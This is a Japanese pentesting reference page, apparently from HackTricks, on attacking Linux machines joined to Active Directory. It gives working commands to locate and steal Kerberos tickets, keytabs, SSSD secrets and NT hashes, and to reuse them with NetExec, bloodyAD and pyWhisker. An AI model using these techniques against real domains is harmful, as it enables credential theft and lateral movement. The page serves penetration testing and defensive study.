# Linux Active Directory

LinuxマシンもActive Directory環境内に存在する場合があります。

AD内のLinuxマシンは、Kerberosマテリアルをローカルに保存できます。これには、ユーザーのccache、マシンやサービスのkeytab、SSSDが管理するsecretが含まれます。これらのアーティファクトは通常、他のKerberos credentialと同様に再利用できます。これらの大部分を読み取るには、チケットの所有ユーザーまたはマシン上の**root**になる必要があります。<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

## Enumeration

### LinuxからのAD enumeration

Linux上でAD（またはWindows上のbash）にアクセスできる場合は、[https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn)を使用してADをenumerateできます。

以下のページでは、**LinuxからADをenumerateする他の方法**について学ぶこともできます。


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPAは、主に**Unix**環境向けのMicrosoft Windows **Active Directory**のオープンソースの**代替**です。完全な**LDAP directory**とMIT **Kerberos** Key Distribution Centerを組み合わせ、Active Directoryに類似した管理を実現します。CAおよびRAの証明書管理にDogtag **Certificate System**を利用し、smartcardを含む**multi-factor** authenticationをサポートします。SSSDはUnix authentication process向けに統合されています。<sup>[[14]](#references)[[15]](#references)</sup> 詳細については、以下を参照してください。


{{#ref}}
../software-information/freeipa-pentesting.md
{{#endref}}

### Domain-joined hostのアーティファクト

チケットを扱う前に、**ホストがどのようにADへjoinされたか**、および**Kerberosマテリアルが実際にどこへ保存されているか**を特定します。現代のLinuxホストでは、これは通常、`realmd` + `adcli` + `sssd`によって処理され、`/tmp`内の単純なflat fileだけで管理されているわけではありません。<sup>[[10]](#references)</sup>
```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```
これは、host が AD を信頼しているか、SSSD が identities または tickets を cache しているか、さらに **machine/service keytabs** や **KCM secrets** が abuse に利用可能かどうかを迅速に確認できます。<sup>[[4]](#references)[[10]](#references)</sup>

## Playing with tickets

### Pass The Ticket

この page では、**linux host 内で kerberos tickets を見つけられるさまざまな場所**を確認できます。以下の page では、これらの CCache tickets formats を Kirbi（Windows で使用する必要がある format）へ変換する方法と、PTT attack の実行方法を学べます。


{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

**Linux-specific ticket harvesting workflows**（`FILE`、`DIR`、`KEYRING`、`KCM`、`/proc` など）については、専用 page を確認してください:

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### /tmp からの CCACHE ticket reuse

CCACHE files は、**Kerberos credentials を保存する**ための binary formats です。`FILE:/tmp/krb5cc_%{uid}` は現在でも一般的ですが、modern Linux deployments では `DIR:/run/user/%{uid}/krb5cc*`、`KEYRING:persistent:%{uid}`、または `KCM:%{uid}` も使用されます。tickets が `/tmp` に存在すると想定する前に、**`KRB5CCNAME`** environment variable と `default_ccache_name` setting を確認してください。<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```
### keyring からの CCACHE ticket 再利用

**process の memory に保存された Kerberos tickets は抽出可能です**。特に、machine の ptrace protection (`/proc/sys/kernel/yama/ptrace_scope`) が無効になっている場合に可能です。この目的に便利な tool は [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey) にあり、sessions に inject して tickets を `/tmp` に dump することで抽出を容易にします。<sup>[[1]](#references)[[16]](#references)</sup>

この tool を configure して使用するには、以下の手順に従います:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
この手順では、さまざまなセッションへの inject を試行し、抽出したチケットを命名規則 `__krb_UID.ccache` に従って `/tmp` に保存することで成功を示します。<sup>[[1]](#references)</sup>

### SSSD KCM からの CCACHE ticket reuse

SSSD はデータベースのコピーを `/var/lib/sss/secrets/secrets.ldb` に保持します。対応する key は、`/var/lib/sss/secrets/.secrets.mkey` に hidden file として保存されています。デフォルトでは、key は **root** 権限がある場合にのみ読み取り可能です。<sup>[[4]](#references)</sup>

**`SSSDKCMExtractor`** を --database および --key パラメータとともに実行すると、データベースを解析して **secrets を decrypt** します。<sup>[[4]](#references)</sup>
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
Extractorはraw Kerberos JSON payloadsを出力するため、pass-the-cache/pass-the-ticket操作の前に、使用可能なticket cacheまたは別のticket形式へ変換してください。<sup>[[4]](#references)</sup>

### Quick keytabトリアージ
```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```
### /etc/krb5.keytab からアカウントを抽出する

root 権限で動作するサービスに不可欠な Service account のキーは、**`/etc/krb5.keytab`** ファイルに安全に保存されています。サービスのパスワードに相当するこれらのキーは、厳重に機密として扱う必要があります。<sup>[[5]](#references)</sup>

keytab ファイルの内容を確認するには、**`klist`** を使用できます。Linux では、`klist -k -K -e` により、principal、key version number、encryption type、および raw key material が出力されます。キーのタイプが **23 / RC4-HMAC** の場合、キーの値はその principal の **NT hash** でもあります。<sup>[[6]](#references)[[17]](#references)</sup>
```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```
Linuxユーザー向けに、**`KeyTabExtract`** はRC4 HMAC hashをextractする機能を提供しており、NTLM hash reuseに利用できます。ただし、これはkeytabに**etype 23 / RC4-HMAC** materialがまだ含まれている場合にのみ役立ちます。**AES-only**環境では、再利用可能なNT hashを取得できない可能性がありますが、Kerberos経由でkeytabを直接使用してauthenticateすることはできます。<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
macOSでは、**`bifrost`**はkeytabファイルの分析ツールとして機能します。<sup>[[8]](#references)</sup>
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
抽出したアカウントおよびハッシュ情報を利用すると、**`NetExec`** などのツールを使用してサーバーへの接続を確立できます。<sup>[[9]](#references)</sup>
```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache nxc smb <DC_FQDN> --use-kcache
```
### `/etc/krb5.keytab` の machine account を再利用する

`realmd`/`adcli`/`sssd` で join されたシステムでは、`/etc/krb5.keytab` に通常、**computer account** と1つ以上の **host/service principals** が含まれています。**root** を持っている場合は、単に内容を dump するのではなく、`klist -k` で一覧表示される principal のいずれかを使用して TGT を要求し、Linux host 自体として操作します。<sup>[[10]](#references)</sup>
```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```
これは、**computer object** 自体が AD で委任された権限を持っている場合や、ホストが **gMSA** などの他の secrets を取得できる場合に、特に有用です。<sup>[[13]](#references)</sup>

### Linux-first AD tooling で盗んだ Kerberos material を再利用する

有効な `ccache` または使用可能な keytab を取得したら、すべてを最初に Windows 形式へ変換することなく、**Linux から直接** AD に対して操作できます。多くの modern tools は `KRB5CCNAME` / Kerberos auth をネイティブにサポートしています。<sup>[[9]](#references)[[11]](#references)[[12]](#references)</sup>
```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
--target 'WEB01$' --action list
```
これは **Linux post-exploitation** と **AD object abuse** をつなぐ有用な橋渡しです。object-level abuse paths 自体については、以下を確認してください。

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Linux gMSA / Managed Service Account artefacts

最近の Linux deployments では、AD から **Managed Service Accounts** を直接利用できます。実際には、Linux server を compromise した後、host keytab だけでなく、gMSA から生成された **service-specific keytabs** も見つかる可能性があるということです。一般的に確認すべき場所は、`/etc/gmsad.conf`、deployment-specific config files、および `/etc` 配下の追加の `*.keytab` files です。<sup>[[2]](#references)[[13]](#references)</sup>
```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```
これは、**Windows endpoint に一切触れることなく**、その gMSA にバインドされた SPN 用の再利用可能な Kerberos identity を提供します。<sup>[[13]](#references)</sup> AD でより高い権限を取得した後の **domain-side** gMSA/dMSA abuse については、以下を確認してください:

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [Kerberos (II): Kerberos を攻撃する方法](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [2] [managed service account を使用した AD へのアクセス – RHEL システムと Active Directory の直接統合](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory)
- [3] [Kerberos environment variables – MIT Kerberos Documentation](https://web.mit.edu/Kerberos/krb5-latest/doc/user/user_config/kerberos.html)
- [4] [SSSDKCMExtractor](https://github.com/mandiant/SSSDKCMExtractor)
- [5] [keytab – MIT Kerberos Documentation](https://web.mit.edu/kerberos/krb5-latest/doc/basic/keytab_def.html)
- [6] [RFC 4757: Microsoft Windows で使用される RC4-HMAC Kerberos 暗号化タイプ](https://www.rfc-editor.org/rfc/rfc4757)
- [7] [KeyTabExtract](https://github.com/sosdave/KeyTabExtract)
- [8] [bifrost](https://github.com/its-a-feature/bifrost)
- [9] [Kerberos の使用 | NetExec](https://www.netexec.wiki/getting-started/using-kerberos)
- [10] [Identity Domains の検出と Join | Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/windows_integration_guide/realmd-domain)
- [11] [bloodyAD User Guide](https://github.com/CravateRouge/bloodyAD/wiki/User-Guide)
- [12] [pyWhisker](https://github.com/ShutdownRepo/pywhisker)
- [13] [gmsad](https://github.com/cea-sec/gmsad)
- [14] [概要 | FreeIPA documentation](https://www.freeipa.org/About.html)
- [15] [FreeIPA 4.11.0 リリースノート](https://www.freeipa.org/release-notes/4-11-0.html)
- [16] [Yama – The Linux Kernel documentation](https://docs.kernel.org/admin-guide/LSM/Yama.html)
- [17] [klist – MIT Kerberos Documentation](https://web.mit.edu/kerberos/krb5-current/doc/user/user_commands/klist.html)
{{#include ../../banners/hacktricks-training.md}}
